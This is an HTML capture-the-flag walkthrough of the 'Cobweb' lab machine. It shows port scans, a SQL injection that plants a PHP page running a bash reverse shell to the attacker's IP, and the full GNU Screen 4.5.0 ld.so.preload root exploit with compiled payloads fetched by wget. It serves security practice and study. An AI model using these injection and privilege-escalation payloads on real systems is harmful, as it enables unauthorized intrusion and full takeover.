@@ -1,0 +1,422 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Cobweb Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Cobweb Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#foothold">Shell - apache</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+    <p>Cobweb involved finding a SQL injection on the web server.  This sql injection allowed us to gain shell through a remote shell.  Once on the box we are able to escalate our privileges to root by exploiting a program that has the SUID bit set.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Fri Sep 17 09:55:05 2021 as: nmap -p- -oN ping_tcp 192.168.248.162
+Nmap scan report for 192.168.248.162
+Host is up (0.038s latency).
+Not shown: 65530 filtered ports
+PORT     STATE  SERVICE
+21/tcp   open   ftp
+22/tcp   open   ssh
+80/tcp   open   http
+3306/tcp open   mysql
+9090/tcp closed zeus-admin
+
+# Nmap done at Fri Sep 17 09:58:03 2021 -- 1 IP address (1 host up) scanned in 178.00 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Fri Sep 17 09:59:05 2021 as: nmap -p21,22,80,3306 -sV -sC -oN script_tcp 192.168.248.162
+Nmap scan report for 192.168.248.162
+Host is up (0.042s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#039;t get directory listing: ERROR
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.49.248
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 15:5f:9b:80:bc:c4:02:ff:24:71:0a:6f:4e:2e:84:35 (RSA)
+|   256 0f:cb:6b:3d:31:e6:4c:0b:76:db:6e:7d:46:c2:d0:43 (ECDSA)
+|_  256 18:47:98:78:55:37:98:52:33:0a:96:1f:06:66:a2:bc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.37 ((centos))
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+|_http-server-header: Apache/2.4.37 (centos)
+|_http-title: Login
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   NULL, RPCCheck, SIPOptions, X11Probe, giop, oracle-tns: 
+|_    Host &#039;192.168.49.248&#039; is not allowed to connect to this MariaDB server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.91%I=7%D=9/17%Time=61449F30%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,4D,&quot;I\0\0\x01\xffj\x04Host\x20&#039;192\.168\.49\.248&#039;\x20is\x20not\x20al
+SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(RPCCheck,
+SF:4D,&quot;I\0\0\x01\xffj\x04Host\x20&#039;192\.168\.49\.248&#039;\x20is\x20not\x20allow
+SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(X11Probe,4D,
+SF:&quot;I\0\0\x01\xffj\x04Host\x20&#039;192\.168\.49\.248&#039;\x20is\x20not\x20allowed\
+SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(SIPOptions,4D,&quot;
+SF:I\0\0\x01\xffj\x04Host\x20&#039;192\.168\.49\.248&#039;\x20is\x20not\x20allowed\x
+SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(oracle-tns,4D,&quot;I
+SF:\0\0\x01\xffj\x04Host\x20&#039;192\.168\.49\.248&#039;\x20is\x20not\x20allowed\x2
+SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(giop,4D,&quot;I\0\0\x0
+SF:1\xffj\x04Host\x20&#039;192\.168\.49\.248&#039;\x20is\x20not\x20allowed\x20to\x20
+SF:connect\x20to\x20this\x20MariaDB\x20server&quot;);
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Sep 17 09:59:20 2021 -- 1 IP address (1 host up) scanned in 15.37 seconds
+    </pre>
+
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>The files on the ftp server turn out to be the first point of interest.  We need to download them.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cobweb/exfiltrated/ftp]
+&#x2514;&#x2500;$ ftp 192.168.248.162
+Connected to 192.168.248.162.
+220 (vsFTPd 3.0.3)
+Name (192.168.248.162:kali): anonymous
+530 Please login with USER and PASS.
+530 Please login with USER and PASS.
+SSL not available
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0              54 Aug 27 14:20 pub
+226 Directory send OK.
+ftp&gt; cd pub
+250 Directory successfully changed.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 501      20            955 Aug 27 13:25 access.log
+-rw-r--r--    1 501      20            530 Aug 27 13:28 auth.log
+-rw-r--r--    1 501      20            176 Aug 27 13:30 syslog
+226 Directory send OK.
+ftp&gt; mget *
+mget access.log? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for access.log (955 bytes).
+226 Transfer complete.
+955 bytes received in 0.00 secs (672.8840 kB/s)
+mget auth.log? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for auth.log (530 bytes).
+226 Transfer complete.
+530 bytes received in 0.00 secs (696.6058 kB/s)
+mget syslog? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for syslog (176 bytes).
+226 Transfer complete.
+176 bytes received in 0.00 secs (212.9802 kB/s)
+ftp&gt; exit
+221 Goodbye.
+    </pre>
+
+    <li>Inside the file access.log we find an interesting line</li>
+    <ul>
+        <li>192.168.118.5 - - [27/Aug/2021:08:47:04 -0400] <mark>"GET /.index.php.swp</mark> HTTP/1.1&quot; 200 5422 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</li>
+    </ul>
+
+    <h2><a id="www-data">Shell - apache</a></h2>
+
+    <li>When we visit http://192.168.248.162/.index.php.swp we see some php code involving interaction with the SQL database.  I used curl to download the contents of this page.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb/exfiltrated]
+&#x2514;&#x2500;$ curl http://192.168.248.162/.index.php.swp -o index.php.swp                   6 &#x2a2f;
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   917  100   917    0     0  10188      0 --:--:-- --:--:-- --:--:-- 10188
+    </pre>
+
+    <li>I pasted this code into a php beautifier that I found on google to make it easier to read.  I also added comments to the code to give a brief explanation of the vulnerabilities in the code and how we will exploit them.</li>
+
+    <img src="../images/cobweb/sql_injection.png">
+    
+    <br>
+    <br>
+
+    <li>Now we will exploit this code using a URL sql injection.  I send this through Firefox to create a web page containing a reverse shell.</li>
+    <ul>
+        <li>http://192.168.248.162/"; INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'system("bash -i >& /dev/tcp/192.168.49.248/4444 0>&1");');-- -</li>
+    </ul>
+
+    <li>Once I have created the reverse shell webpage I start a reverse listener (nc -lvnp 4444) and then execute the code by visiting http://192.168.248.162/rev</li>
+    <ul>
+        <li>The reverse shell connects and I gain a shell as the user apache.</li>
+    </ul>
+
+    <h2><a id="root">Privesc - Root</a></h2>
+
+    <li>I search for all files that have the SUID bit set and the one that stands out is screens-4.5.0</li>
+
+    <pre>
+bash-4.4$ find / -perm -u=s 2&gt;/dev/null
+find / -perm -u=s 2&gt;/dev/null
+/var/tmp/rootshell
+/usr/bin/fusermount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/crontab
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/fusermount3
+/usr/bin/screen-4.5.0
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/userhelper
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+/usr/libexec/cockpit-session
+/usr/libexec/sssd/krb5_child
+/usr/libexec/sssd/ldap_child
+/usr/libexec/sssd/proxy_child
+/usr/libexec/sssd/selinux_child
+    </pre>
+
+    <li>We go to searchsploit and search for any exploits for it.  I also include the version 4.5 in my search.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ searchsploit screen 4.5
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+GNU Screen 4.5.0 - Local Privilege Escalation                                                                               | linux/local/41154.sh
+GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                         | linux/local/41152.txt
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    </pre>
+
+    <li>We find a privesc exploit.  So we download linux/local/41154.sh and take a look at it.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ searchsploit -m 41154         
+  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/41154
+     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
+File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/kali/Documents/ProvingGrounds/Cobweb/41154.sh
+
+
+                                                                                                                                                              
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ cat 41154.sh  
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017) 
+echo &quot;~ gnu/screenroot ~&quot;
+echo &quot;[+] First, we create our shell and library...&quot;
+cat &lt;&lt; EOF &gt; /tmp/libhax.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!\n&quot;);
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat &lt;&lt; EOF &gt; /tmp/rootshell.c
+#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
+echo &quot;[+] Triggering...&quot;
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell                                                     
+    </pre>
+
+    <li>The script is having us create a file called libhax.so and rootshell.  We will compile both of these files on our Kali machine and then transfer them to the victim since our reverse shell is not the greatest.  We also need to modify the exploit to target "/var/tmp" instead of "/tmp".  On this machine the directories "/tmp" and "/dev/shm" have 'nosuid' and 'noexec' set.  Linpeas will show us this, which I ran shortly after beginning to poke around in this machine.</li>
+
+    <img src="../images/cobweb/linpeas.png">
+
+    <li>Compiling libhax.c</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ cat libhax.c   
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/var/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/var/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!\n&quot;);
+}
+                                                                                                                                                              
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ gcc -fPIC -shared -ldl -o libhax.so libhax.c
+libhax.c: In function &lsquo;dropshell&rsquo;:
+libhax.c:7:5: warning: implicit declaration of function &lsquo;chmod&rsquo; [-Wimplicit-function-declaration]
+    7 |     chmod(&quot;/var/tmp/rootshell&quot;, 04755);
+      |     ^~~~~
+    </pre>
+
+    <li>Compiling rootshell</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ cat rootshell.c 
+#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}
+                                                                                                                                                              
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ gcc -o rootshell rootshell.c                
+rootshell.c: In function &lsquo;main&rsquo;:
+rootshell.c:3:5: warning: implicit declaration of function &lsquo;setuid&rsquo; [-Wimplicit-function-declaration]
+    3 |     setuid(0);
+      |     ^~~~~~
+rootshell.c:4:5: warning: implicit declaration of function &lsquo;setgid&rsquo; [-Wimplicit-function-declaration]
+    4 |     setgid(0);
+      |     ^~~~~~
+rootshell.c:5:5: warning: implicit declaration of function &lsquo;seteuid&rsquo; [-Wimplicit-function-declaration]
+    5 |     seteuid(0);
+      |     ^~~~~~~
+rootshell.c:6:5: warning: implicit declaration of function &lsquo;setegid&rsquo; [-Wimplicit-function-declaration]
+    6 |     setegid(0);
+      |     ^~~~~~~
+rootshell.c:7:5: warning: implicit declaration of function &lsquo;execvp&rsquo; [-Wimplicit-function-declaration]
+    7 |     execvp(&quot;/bin/sh&quot;, NULL, NULL);
+      |     ^~~~~~
+rootshell.c:7:5: warning: too many arguments to built-in function &lsquo;execvp&rsquo; expecting 2 [-Wbuiltin-declaration-mismatch]
+    </pre>
+
+    <li>Downloading rootshell and libhax.so to /var/tmp</li>
+
+    <pre>
+bash-4.4$ cd /var/tmp
+cd /var/tmp
+bash-4.4$ wget http://192.168.49.248/libhax.so
+wget http://192.168.49.248/libhax.so
+--2021-09-18 15:25:34--  http://192.168.49.248/libhax.so
+Connecting to 192.168.49.248:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16136 (16K) [application/octet-stream]
+Saving to: 'libhax.so'
+
+     0K .......... .....                                      100%  393K=0.04s
+
+2021-09-18 15:25:34 (393 KB/s) - 'libhax.so' saved [16136/16136]
+
+bash-4.4$ wget http://192.168.49.248/rootshell
+wget http://192.168.49.248/rootshell
+--2021-09-18 15:25:42--  http://192.168.49.248/rootshell
+Connecting to 192.168.49.248:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16816 (16K) [application/octet-stream]
+Saving to: 'rootshell'
+
+     0K .......... ......                                     100%  420K=0.04s
+
+2021-09-18 15:25:42 (420 KB/s) - 'rootshell' saved [16816/16816]
+    </pre>
+
+    <li>Executing the exploit</li>
+
+    <pre>
+bash-4.4$ chmod +x /var/tmp/rootshell
+chmod +x /var/tmp/rootshell
+bash-4.4$ cd /etc
+cd /etc
+bash-4.4$ umask 000
+umask 000
+bash-4.4$ screen -D -m -L ld.so.preload echo -ne  "\x0a/var/tmp/libhax.so"
+screen -D -m -L ld.so.preload echo -ne  "\x0a/var/tmp/libhax.so"
+bash-4.4$ screen -ls
+screen -ls
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-apache.
+
+bash-4.4$ /var/tmp/rootshell
+/var/tmp/rootshell
+id
+uid=0(root) gid=0(root) groups=0(root),48(apache)
+    </pre>
+
+    <li>Rooted.</li>
+</body>
+</html>
+
